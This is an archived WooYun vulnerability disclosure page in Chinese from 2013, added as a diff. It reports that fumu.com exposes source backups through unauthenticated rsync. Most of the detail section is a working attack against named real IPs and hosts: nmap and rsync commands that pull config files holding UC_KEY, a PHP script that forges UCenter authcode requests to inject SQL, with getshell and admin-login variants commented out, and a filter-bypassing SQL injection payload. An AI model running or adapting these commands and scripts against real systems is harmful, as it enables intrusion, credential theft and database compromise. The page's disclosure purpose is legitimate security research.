@@ -1,0 +1,366 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		父母网rsync信息泄露源代码导致安全问题  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		父母网rsync信息泄露源代码导致安全问题  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/五道口杀气">五道口杀气</a> 
+</li><li>提交时间：		2013-11-13 17:30</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-13：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-13：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-11-23：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-12-03：	细节向普通白帽子公开<br/>
+									2013-12-13：	细节向实习白帽子公开<br/>
+									2013-12-28：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">在drops上看到rsync的这个文章http://drops.wooyun.org/papers/161，再看wooyun上的漏洞好像很多大网站都没有注意其他网站呢？<br />
+随便找了一个试试手，还涉及UC_KEY利用，中转脚本等思想。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">www.fumu.com<br />
+<br />
+ip 210.14.136.87<br />
+<br />
+按照文章给出的教程利用命令扫C段的rsync试下<br />
+<br />
+</p><pre><code>nmap -n --open -p 873 210.14.136.1-255</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/1212234479abce564353d98788220a85c6808d56.jpeg" target="_blank"><img src="../images/1212234479abce564353d98788220a85c6808d56.jpeg" alt="f1.jpeg" width="600"/></a></p><p class="detail"><br />
+<br />
+当我连接到93服务器时惊喜来了：<br />
+<br />
+</p><pre><code>rsync 210.14.136.93::</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/12122441eb30a68d14d4d964d48dcfbc9c53ce22.jpeg" target="_blank"><img src="../images/12122441eb30a68d14d4d964d48dcfbc9c53ce22.jpeg" alt="f2.jpeg" width="600"/></a></p><p class="detail"><br />
+<br />
+主站就是用的phpcms，这里的phpcms模块应该就是备份的主站代码。<br />
+<br />
+而bak目录貌似下备份了所有代码<br />
+<br />
+查看一下：<br />
+<br />
+</p><pre><code>rsync 210.14.136.93::bak</code></pre><p class='detail'><br />
+<br />
+存在很多目录<br />
+<br />
+</p><p class="detail"><a href="../images/1212255132b3502693658a4d8ce90d03303ed6fe.jpeg" target="_blank"><img src="../images/1212255132b3502693658a4d8ce90d03303ed6fe.jpeg" alt="f3.jpeg" width="600"/></a></p><p class="detail"><br />
+<br />
+找到bbs下的UC_KEY<br />
+<br />
+</p><pre><code>rsync 210.14.136.93::bak/newbbs/config/</code></pre><p class='detail'><br />
+<br />
+存在uc，找到data目录下的config.inc.php<br />
+<br />
+同步下来看看内容：<br />
+<br />
+</p><pre><code>rsync -vzrtopg --progress 210.14.136.93::bak/uc/data/config.inc.php /Users/test/fumubak <br />
+rsync -vzrtopg --progress 210.14.136.93::bak/newbbs/config/config_ucenter.php /Users/test/fumubak/</code></pre><p class='detail'><br />
+<br />
+打开本地fumubak目录里的config_ucenter.php文件，找到UC_KEY。<br />
+<br />
+拿到UC_KEY可以干嘛，可以做好多，参见之前牛奶坦克发的漏洞  <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2012-010939">WooYun: 齐博cms整站系统（原PHP168）配置不当导致任意用户登陆</a>  <br />
+<br />
+利用UC_KEY里面的函数都可以直接调用了，看下uc.php里的函数：<br />
+<br />
+</p><pre><code>rsync -vzrtopg --progress 210.14.136.93::bak/newbbs/api/uc.php /Users/test/fumubak/db</code></pre><p class='detail'><br />
+<br />
+看到updateapps写文件，这是要写shell的漏洞啊，测了半天忽略了var_export函数，转义了单引号，无法截断。。。。。。<br />
+<br />
+</p><p class="detail"><a href="../images/12122935119d9215a08c8fcef509f59e3f02c52b.jpeg" target="_blank"><img src="../images/12122935119d9215a08c8fcef509f59e3f02c52b.jpeg" alt="f4.jpeg" width="600"/></a></p><p class="detail"><br />
+<br />
+同时也有有synlogin可以设置cookie，已管理员的身份登录，但是dz进入后台需要再输入一遍密码无法进到后台。<br />
+<br />
+最后发现deleteuser那里有个sql注入，同样利用http://drops.wooyun.org/tips/125思路。<br />
+<br />
+把牛奶坦克那个脚本改一下做个代理方便注入：<br />
+<br />
+</p><pre><code>&lt;?php<br />
+error_reporting(0);<br />
+$host = &quot;bbs.fumu.com&quot;;<br />
+//$doing = $argv[2];<br />
+$time = time()+10*3600;<br />
+$getshell = 0;<br />
+    // if ($doing == &#039;login&#039;) {<br />
+    //     // synlogin ，不过只登陆第一个admin帐户，如果uid1不是管理员，需要自己手工找下<br />
+    //     $code = &#039;time=&#039;.$time.&#039;&amp;uid=1&amp;username=administrator&amp;action=synlogin&#039;;<br />
+    // } elseif ($doing == &#039;shell&#039; ) {<br />
+    //     $code = &#039;time=&#039;.$time.&#039;&amp;action=updateapps&#039;;<br />
+    // } elseif ($doing == &#039;temp&#039; ) {<br />
+    //     $code = &#039;time=&#039;.$time.&#039;&amp;ids=203881) and 1=1&amp;action=deleteuser&#039;;<br />
+    // } else {<br />
+    //     $doing = &#039;test&#039;;<br />
+    //     $code = &#039;time=&#039;.$time.&#039;&amp;action=&#039;.$doing;<br />
+    // }<br />
+$sqlin = $_GET[&#039;id&#039;];<br />
+$sqlin=str_replace(&quot; &quot;,&quot;%20&quot;,$sqlin);<br />
+$sqlin=str_replace(&quot;=&quot;,&quot;%3D&quot;,$sqlin);<br />
+$code = &#039;time=&#039;.$time.&quot;&amp;ids=$sqlin&amp;action=deleteuser&quot;;<br />
+$uc_key = array(<br />
+    //&#039;null&#039; =&gt; &#039;&#039;,<br />
+    &#039;bbs&#039; =&gt; &#039;59XXXXXXXXXXXXXXXX9Ib&#039;,<br />
+    //&#039;www&#039;=&gt;&#039;cf5XXXXXXXXXXXXXXXXXXXqaY2y&#039;<br />
+);<br />
+foreach ($uc_key as $key =&gt; $value) {<br />
+    $exp = &#039;api/uc.php?code=&#039;.urlencode(authcode($code, &quot;ENCODE&quot;, $value));<br />
+    //echo &quot;http://$host/$exp&quot;;<br />
+    $result = file_get_contents(&quot;http://$host/$exp&quot;);<br />
+    print_r($result);<br />
+    //$status = get_headers(&quot;http://$host/$exp&quot;);<br />
+   <br />
+    //if( $result !== &#039;Authracation has expiried&#039; &amp; strpos($status[0] , &#039;200&#039; ) &gt; 0 ){<br />
+    //echo $result;<br />
+    //echo &quot;[+] UC_KEY &#039;$key&#039; can use .\r\n&quot;;<br />
+    //echo &quot;[*] EXP = $exp \r\n&quot;;<br />
+    /*<br />
+    if ( $getshell == 1 ) {  //Get shell<br />
+        echo &quot;[+]Getshell...\r\n&quot;;<br />
+        $cmd = array(<br />
+        &#039;one&#039; =&gt;<br />
+        &#039;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;<br />
+        &lt;root&gt;<br />
+         &lt;item id=&quot;appid&quot;&gt;123\&#039;);phpinfo();//&lt;/item&gt;<br />
+        &lt;/root&gt;&#039;<br />
+        );<br />
+<br />
+        foreach ($cmd as $key =&gt; $value) {<br />
+            $res = send($host,$exp,$value);<br />
+        }<br />
+<br />
+        $getshell = 0;<br />
+    }<br />
+    print(&quot;[+]Try to<br />
+    http://$host/member/api/client/data/cache/apps.php<br />
+    or<br />
+    http://$host/uc_client/data/cache/apps.php\r\n&quot;);<br />
+    */<br />
+<br />
+    //} else {<br />
+        //echo &quot;[+] UC_KEY &#039;$key&#039; &quot;. $result.&quot;\r\n&quot;;<br />
+    //}<br />
+}<br />
+function send($host,$code,$cmd){<br />
+    $message = &quot;POST /&quot;.$code.&quot;  HTTP/1.1\r\n&quot;; <br />
+    $message .= &quot;Accept: */*\r\n&quot;; <br />
+    $message .= &quot;Referer: &quot;.$host.&quot;\r\n&quot;; <br />
+    $message .= &quot;Accept-Language: zh-cn\r\n&quot;;<br />
+    $message .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;; <br />
+    $message .= &quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)\r\n&quot;; <br />
+    $message .= &quot;Host: &quot;.$host.&quot;\r\n&quot;; <br />
+    $message .= &quot;Content-Length: &quot;.strlen($cmd).&quot;\r\n&quot;; <br />
+    $message .= &quot;Connection: Close\r\n\r\n&quot;;<br />
+    $message .= $cmd;<br />
+    $fp = fsockopen($host, 80); <br />
+    fputs($fp, $message); <br />
+    $resp = &#039;&#039;; <br />
+    while ($fp &amp;&amp; !feof($fp)) <br />
+        $resp .= fread($fp, 1024); <br />
+    return $resp;<br />
+}<br />
+function authcode($string, $operation = &#039;DECODE&#039;, $key = &#039;&#039;, $expiry = 0) {<br />
+    $ckey_length = 4;<br />
+    $key = md5($key ? $key : UC_KEY);<br />
+    $keya = md5(substr($key, 0, 16));<br />
+    $keyb = md5(substr($key, 16, 16));<br />
+    $keyc = $ckey_length ? ($operation == &#039;DECODE&#039; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &#039;&#039;;<br />
+    $cryptkey = $keya.md5($keya.$keyc);<br />
+    $key_length = strlen($cryptkey);<br />
+    $string = $operation == &#039;DECODE&#039; ? base64_decode(substr($string, $ckey_length)) : sprintf(&#039;%010d&#039;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;<br />
+    $string_length = strlen($string);<br />
+    $result = &#039;&#039;;<br />
+    $box = range(0, 255);<br />
+    $rndkey = array();<br />
+    for($i = 0; $i &lt;= 255; $i++) {<br />
+        $rndkey[$i] = ord($cryptkey[$i % $key_length]);<br />
+    }<br />
+    for($j = $i = 0; $i &lt; 256; $i++) {<br />
+        $j = ($j + $box[$i] + $rndkey[$i]) % 256;<br />
+        $tmp = $box[$i];<br />
+        $box[$i] = $box[$j];<br />
+        $box[$j] = $tmp;<br />
+    }<br />
+    for($a = $j = $i = 0; $i &lt; $string_length; $i++) {<br />
+        $a = ($a + 1) % 256;<br />
+        $j = ($j + $box[$a]) % 256;<br />
+        $tmp = $box[$a];<br />
+        $box[$a] = $box[$j];<br />
+        $box[$j] = $tmp;<br />
+        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));<br />
+    }<br />
+    if($operation == &#039;DECODE&#039;) {<br />
+        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {<br />
+            return substr($result, 26);<br />
+        } else {<br />
+            return &#039;&#039;;<br />
+        }<br />
+    } else {<br />
+        return $keyc.str_replace(&#039;=&#039;, &#039;&#039;, base64_encode($result));<br />
+    }<br />
+ <br />
+}</code></pre><p class='detail'><br />
+<br />
+从脚本中的注释也看一看出测试过程多蛋疼。。。<br />
+<br />
+以为顺利注入就可以了，在/source/class/class_core.php中还有放注入函数……<br />
+<br />
+</p><p class="detail"><a href="../images/121232333927af7fccb052fb22190b1fd5fbdc7a.jpeg" target="_blank"><img src="../images/121232333927af7fccb052fb22190b1fd5fbdc7a.jpeg" alt="f5.jpeg" width="600"/></a></p><p class="detail"><br />
+<br />
+绕过方式：<br />
+<br />
+http://127.0.0.1/ucbbs.php?id=1)%20and%20(/*!select*/%201%20FROM%20(/*!select*/%20count(*),concat(floor(rand(0)*2),(/*!select*/%20version()))a%20from%20information_schema.tables%20group%20by%20a)b)%20and%20(1)=(1<br />
+<br />
+</p><p class="detail"><a href="../images/12123319fb81dd3367327e1675da29887fc36d00.jpeg" target="_blank"><img src="../images/12123319fb81dd3367327e1675da29887fc36d00.jpeg" alt="f6.jpeg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+还有别的事情，不搞了，不过发现rsync里面都有shell了，，，只不过没找到位置，还有uc.fumu.com都被挂马了。<br />
+<br />
+你要不要参加个乌云众测保障下安全啊？<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">参考：http://drops.wooyun.org/papers/161 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/五道口杀气" title="五道口杀气">五道口杀气</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-028654" title="父母网rsync信息泄露源代码导致安全问题">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2013-11-13 17:35</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">网站部署欠缺经验，目前正在修复，并自查。感谢  @五道口杀气</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="28654";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
